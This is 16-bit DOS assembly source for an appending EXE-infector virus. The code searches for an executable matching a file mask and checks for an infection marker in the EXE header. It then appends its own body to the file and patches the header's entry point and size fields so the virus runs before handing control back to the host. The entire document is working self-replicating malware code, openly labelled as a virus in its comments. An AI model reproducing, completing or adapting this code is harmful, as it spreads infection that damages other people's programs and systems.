.model small
.stack 100h
.code
start:

; setting ds
push cs
pop ds

; original entry point calculation
fresh_bytes:
push es
pop ax
add ax,10h
add ax,ds:old_cs
push ax
mov ax,ds:old_ip
push ax

; finding the first .exe file
find_first:
mov ah, 4eh
xor cx,cx
lea dx,fmask
find_first_next:
int 21h
jc exit

; found file opening
open:
push es
pop ds
mov ax, 3d02h
push bx
mov bx, 9eh
lea dx, [bx]
pop bx
int 21h
push cs
pop ds
jc find_next

; reading exe header
save_bytes:
xchg bx,ax
mov ah,03fh
mov cx,1Ah
lea dx,header
int 21h
jc find_next

; check for infection
infection_check:
cmp byte ptr ds:[header+13h],'3'
jz find_next

; saving ip0 & cs0
mov ax,word ptr ds:[header+14h]
mov ds:old_ip,ax
mov ax,word ptr ds:[header+16h]
mov ds:old_cs,ax

; calculating new header values
call calculate_header

; writing the payload to the end of the file
write_vir:
mov ax,4200h
int 21h
jc find_next
mov ah,40h
mov cx,vir_len
lea dx,start
int 21h
jc find_next

; writing the modded header
write_header:
mov ax,4200h
xor cx,cx
xor dx,dx
int 21h
jc find_next
mov ah,40h
mov cx,1Ah
lea dx,header
int 21h

; closing current file and moving next
find_next:
mov ah,3eh
int 21h
mov ah,4fh
jmp find_first_next

; restoring ds
exit:
push es
pop ds

; transferring control to original program
retf

; the new header vals calc proc
calculate_header proc

; infection mark
mov byte ptr ds:[header+13h],'3'

; filesize from DTA
mov ax,word ptr es:[9Ah]
mov dx,word ptr es:[9Ch]

; modding filesize
or ax,0000Fh
inc ax
adc dx,0
push ax
push dx
push ax

; calculating offset of the virus
mov cx,10h
div cx
sub ax,word ptr ds:[header+8]

; the remainder of modded virus offset
mov word ptr ds:[header+14h],dx

; the quotent of modded virus offset
mov word ptr ds:[header+16h],ax

; adding the vir offset to low part
pop ax
and ah,1
add ax,vir_len
cmp ax,512
jb ok

; if bigger then 512, then correcting 2 fileds
; only one otherwise
sub ax,512
mov dx,word ptr ds:[header+4]
inc dx
mov word ptr ds:[header+4],dx
ok:
mov word ptr ds:[header+2],ax

; saving the file pointer
pop cx
pop dx
ret
calculate_header endp

; modelling start from infected program
exe_end:
mov ax,4C00h
int 21h

; data
old_ip dw offset exe_end
old_cs dw 0
fmask db 'avic4.exe',0
header equ $
vir_len equ $-start
end start
